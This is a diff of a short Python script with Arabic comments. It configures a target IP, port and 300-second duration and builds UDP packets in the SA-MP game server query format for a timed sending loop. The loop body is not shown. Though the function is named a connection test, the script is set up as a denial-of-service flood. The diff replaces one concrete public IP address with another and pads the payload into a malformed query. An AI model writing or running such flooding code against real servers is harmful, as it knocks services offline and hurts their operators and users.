@@ -2,15 +2,15 @@ import socket
 import time
 
 # حدد البيانات
-TARGET_IP = "45.154.98.154"  # استبدله بـ IP الهدف
-TARGET_PORT = 7781      # استبدله بمنفذ السيرفر
+TARGET_IP = "94.23.168.153"  # استبدله بـ IP الهدف
+TARGET_PORT = 2343      # استبدله بمنفذ السيرفر
 DURATION = 300              # مدة الاختبار بالثواني
 
 def test_connection():
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     # حزمة استعلام SAMP بسيطة (Info Query)
-    payload = b'SAMP' + socket.inet_aton(TARGET_IP)[:900] + int(TARGET_PORT).to_bytes(2, 'little') + b'i'
+    payload = b'SAMP' + socket.inet_aton(TARGET_IP)[:50] + int(TARGET_PORT).to_bytes(50, 'little') + b'i'
     
     end_time = time.time() + DURATION
     count = 0
